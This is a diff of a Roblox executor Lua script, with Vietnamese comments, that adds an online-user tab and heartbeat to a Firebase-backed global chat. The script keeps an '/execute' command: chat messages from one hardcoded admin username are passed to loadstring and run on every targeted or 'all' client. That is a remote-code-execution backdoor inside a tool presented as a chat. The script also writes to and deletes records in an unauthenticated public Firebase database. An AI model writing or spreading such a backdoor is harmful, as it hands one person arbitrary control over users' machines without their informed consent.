@@ -1,4 +1,4 @@
--- Global Chat AltisLib (URL IMAGE SUPPORT + AUTO SCALE + COMMAND + ADMIN)
+-- Global Chat AltisLib (ONLINE TAB + HEARTBEAT + COMMAND + AUTO SCALE)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -29,20 +29,33 @@ Window:SetBackgroundImage("rbxassetid://137021248562867")
 Window:SetBackgroundImageTransparency(0.4)
 
 ---------------------------------------------------
--- TẠO 2 TABS
+-- TẠO CÁC TABS
 ---------------------------------------------------
+-- TAB 1: Chat
 local Tab1 = Window:CreateTab("Khung Chat")
 local STab1 = Tab1:CreateSection("Tin nhắn gần đây")
 
+-- TAB 2: Điều khiển
 local Tab2 = Window:CreateTab("Điều khiển")
 local label1 = Tab2:CreateLabel("Chat Cooldown: 1s")
 Tab2:CreateDivider()
+
+-- TAB 3: Người dùng [MỚI]
+local Tab3 = Window:CreateTab("Người dùng")
+local lblAdminCount = Tab3:CreateLabel("[ADMIN] - 0 online")
+local SAdmin = Tab3:CreateSection("Danh sách Admin") -- Gom Admin vào 1 khu vực để không bị lộn xộn
+
+Tab3:CreateDivider()
+
+local lblUserCount = Tab3:CreateLabel("User - 0 online")
+local SUser = Tab3:CreateSection("Danh sách User") -- Gom User vào 1 khu vực
 
 ---------------------------------------------------
 -- LOGIC & VARIABLES
 ---------------------------------------------------
 local FIREBASE_URL = "https://myfirstproject-e1354-default-rtdb.firebaseio.com/"
-local PATH = "globalchat/messages.json"
+local PATH_MESSAGES = "globalchat/messages.json"
+local PATH_ONLINE = "globalchat/online/"
 
 local startTime = os.time()
 local lastSend = 0
@@ -52,6 +65,7 @@ local MAX_UI_MESSAGES = 30
 local running = true
 local messageObjects = {}
 local seen = {}
+local onlineObjects = {} -- Lưu trữ Paragraph của người chơi Online
 
 -- CẤU HÌNH ADMIN
 local ADMIN_USERNAME = "hoang_huy1k9"
@@ -63,7 +77,6 @@ local function now()
     return os.date("%H:%M", os.time())
 end
 
--- [CẬP NHẬT] Kiểm tra xem có phải ảnh không (Nhận cả rbxassetid và link http/https)
 local function isImage(msg)
     if typeof(msg) ~= "string" then return false end
     msg = msg:lower()
@@ -75,7 +88,6 @@ local function updateCooldown()
     label1:SetText("Chat Cooldown: " .. math.ceil(remain) .. "s")
 end
 
--- Hàm tạo tên người gửi (Tự động cấp tag ADMIN)
 local function getSenderPrefix(msg)
     local role = ""
     if msg.username == ADMIN_USERNAME then
@@ -85,7 +97,104 @@ local function getSenderPrefix(msg)
 end
 
 ---------------------------------------------------
--- RENDER & COMMAND SYSTEM
+-- HỆ THỐNG ONLINE/OFFLINE (HEARTBEAT) [MỚI]
+---------------------------------------------------
+local function updateOnlineStatus()
+    -- 1. Bắn tín hiệu "Mình đang online" lên Firebase
+    task.spawn(function()
+        local myData = {
+            displayName = LocalPlayer.DisplayName,
+            username = LocalPlayer.Name,
+            timestamp = os.time() -- Mốc thời gian hiện tại
+        }
+        http_request({
+            Url = FIREBASE_URL .. PATH_ONLINE .. LocalPlayer.UserId .. ".json",
+            Method = "PUT",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(myData)
+        })
+    end)
+
+    -- 2. Lấy danh sách đang Online về
+    local res = http_request({Url = FIREBASE_URL .. "globalchat/online.json", Method = "GET"})
+    if not res or res.StatusCode ~= 200 then return end
+
+    local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+    if not ok or type(data) ~= "table" then data = {} end
+
+    local currentOnline = {}
+    local adminCount = 0
+    local userCount = 0
+
+    -- Phân loại và kiểm tra độ trễ (Offline)
+    for userId, user in pairs(data) do
+        if type(user) == "table" and user.timestamp then
+            -- Nếu tín hiệu cuối cùng được gửi trong vòng 15 giây -> Đang Online
+            if os.time() - user.timestamp <= 15 then
+                currentOnline[userId] = user
+                if user.username == ADMIN_USERNAME then
+                    adminCount = adminCount + 1
+                else
+                    userCount = userCount + 1
+                end
+            else
+                -- Nếu quá 15 giây không có tín hiệu -> Bị văng game / Đã thoát, xóa khỏi DB
+                task.spawn(function()
+                    http_request({
+                        Url = FIREBASE_URL .. PATH_ONLINE .. userId .. ".json",
+                        Method = "DELETE"
+                    })
+                end)
+            end
+        end
+    end
+
+    -- 3. Cập nhật số lượng lên Label
+    lblAdminCount:SetText("[ADMIN] - " .. adminCount .. " online")
+    lblUserCount:SetText("User - " .. userCount .. " online")
+
+    -- 4. Tạo Paragraph cho những người VỪA MỚI ONLINE
+    for userId, user in pairs(currentOnline) do
+        if not onlineObjects[userId] then
+            local isAdmin = (user.username == ADMIN_USERNAME)
+            local formatName = user.displayName .. "(@" .. user.username .. ")"
+            local p
+            
+            if isAdmin then
+                p = SAdmin:CreateParagraph(formatName, "Đang hoạt động")
+            else
+                p = SUser:CreateParagraph(formatName, "Đang hoạt động")
+            end
+            
+            onlineObjects[userId] = { p = p, isAdmin = isAdmin }
+        end
+    end
+
+    -- 5. Destroy() Paragraph của những người ĐÃ OFFLINE
+    for userId, obj in pairs(onlineObjects) do
+        if not currentOnline[userId] then
+            pcall(function()
+                if obj.p and obj.p.Destroy then
+                    obj.p:Destroy()
+                end
+            end)
+            onlineObjects[userId] = nil -- Xóa khỏi bộ nhớ cục bộ
+        end
+    end
+end
+
+-- Khi người chơi chủ động thoát game -> Gửi lệnh xóa lập tức
+Players.PlayerRemoving:Connect(function(plr)
+    if plr == LocalPlayer then
+        http_request({
+            Url = FIREBASE_URL .. PATH_ONLINE .. LocalPlayer.UserId .. ".json",
+            Method = "DELETE"
+        })
+    end
+end)
+
+---------------------------------------------------
+-- RENDER CHAT & COMMAND SYSTEM
 ---------------------------------------------------
 local function createText(msg)
     local prefix = getSenderPrefix(msg)
@@ -95,15 +204,8 @@ end
 local function createImage(msg)
     local prefix = getSenderPrefix(msg)
     local p = STab1:CreateParagraph(prefix, "")
-    
-    local ok = pcall(function()
-        p:CreateImage(msg.message)
-    end)
-    
-    if not ok then 
-        p:SetText(msg.message) 
-    end
-    
+    local ok = pcall(function() p:CreateImage(msg.message) end)
+    if not ok then p:SetText(msg.message) end
     return p
 end
 
@@ -111,30 +213,17 @@ local function addMessage(key, msg)
     if seen[key] then return end
     seen[key] = true
 
-    -- KIỂM TRA LỆNH (COMMAND SYSTEM)
+    -- COMMAND SYSTEM
     if msg.message:match("^/execute") then
         if msg.username == ADMIN_USERNAME then
             local target, code = msg.message:match('^/execute%s+"(.-)"%s+(.+)')
-            
             if target and code then
-                if code:sub(1, 1) == '"' and code:sub(-1, -1) == '"' then
-                    code = code:sub(2, -2)
-                end
-                
-                if target == LocalPlayer.DisplayName 
-                or target == LocalPlayer.Name 
-                or target == "@" .. LocalPlayer.Name 
-                or target:lower() == "all" then
-                    
+                if code:sub(1, 1) == '"' and code:sub(-1, -1) == '"' then code = code:sub(2, -2) end
+                if target == LocalPlayer.DisplayName or target == LocalPlayer.Name or target == "@" .. LocalPlayer.Name or target:lower() == "all" then
                     task.spawn(function()
                         local func, err = loadstring(code)
-                        if func then
-                            pcall(func)
-                        else
-                            warn("Lỗi loadstring do sai cú pháp: ", err)
-                        end
+                        if func then pcall(func) else warn("Lỗi loadstring do sai cú pháp: ", err) end
                     end)
-                    
                     Window:SendNotification("Hệ Thống", "Đang thực thi lệnh từ Admin!", 3)
                 end
             end
@@ -146,9 +235,7 @@ local function addMessage(key, msg)
 
     if #messageObjects > MAX_UI_MESSAGES then
         local oldestObj = table.remove(messageObjects, 1)
-        pcall(function()
-            if oldestObj and oldestObj.Destroy then oldestObj:Destroy() end
-        end)
+        pcall(function() if oldestObj and oldestObj.Destroy then oldestObj:Destroy() end end)
     end
 end
 
@@ -180,21 +267,17 @@ local function sendMessage(text)
     }
 
     http_request({
-        Url = FIREBASE_URL .. PATH,
+        Url = FIREBASE_URL .. PATH_MESSAGES,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(payload)
     })
 end
 
--- [CẬP NHẬT] Gửi ảnh bằng cách chấp nhận cả link URL công khai
 local function sendImage(id)
     id = tostring(id or "")
-    
-    -- Kiểm tra xem nhập vào có phải rbxassetid hoặc link http/https không
     local valid = id:lower():match("^rbxassetid://%d+$") or id:lower():match("^https?://.+")
     if not valid then return end
-    
     if tick() - lastSend < COOLDOWN then return end
     
     lastSend = tick()
@@ -209,7 +292,7 @@ local function sendImage(id)
     }
 
     http_request({
-        Url = FIREBASE_URL .. PATH,
+        Url = FIREBASE_URL .. PATH_MESSAGES,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(payload)
@@ -217,7 +300,7 @@ local function sendImage(id)
 end
 
 local function fetch()
-    local fetchUrl = FIREBASE_URL .. PATH .. '?orderBy="$key"&limitToLast=20'
+    local fetchUrl = FIREBASE_URL .. PATH_MESSAGES .. '?orderBy="$key"&limitToLast=20'
     local res = http_request({Url = fetchUrl, Method = "GET"})
 
     if not res or res.StatusCode ~= 200 then return end
@@ -240,7 +323,7 @@ local function fetch()
 end
 
 ---------------------------------------------------
--- UI EVENTS (ĐƯA VÀO TAB 2)
+-- UI EVENTS (TAB 2)
 ---------------------------------------------------
 local inputMsg = ""
 local inputImg = ""
@@ -250,7 +333,6 @@ Tab2:CreateButton("Gửi tin nhắn", function() sendMessage(inputMsg) end)
 
 Tab2:CreateDivider()
 
--- Đổi label hướng dẫn để người dùng biết là nhập được cả link URL
 Tab2:CreateTextBox("Nhập mã ảnh / Link URL", "rbxassetid:// hoặc https://...", function(t) inputImg = t end)
 Tab2:CreateButton("Gửi ảnh", function() sendImage(inputImg) end)
 
@@ -259,12 +341,21 @@ Tab2:CreateDivider()
 Tab2:CreateButton("Làm sạch khung chat", function() clearChat() end)
 
 ---------------------------------------------------
--- LOOP
+-- LOOP CHÍNH
 ---------------------------------------------------
+local loopTick = 0
+
 coroutine.wrap(function()
     while running do
         updateCooldown()
-        fetch()
+        fetch() -- Cập nhật tin nhắn (Mỗi 1 giây)
+        
+        -- Cứ mỗi 3 giây thì gửi tín hiệu Online và cập nhật danh sách
+        if loopTick % 3 == 0 then
+            task.spawn(updateOnlineStatus)
+        end
+        
+        loopTick = loopTick + 1
         task.wait(1)
     end
 end)()
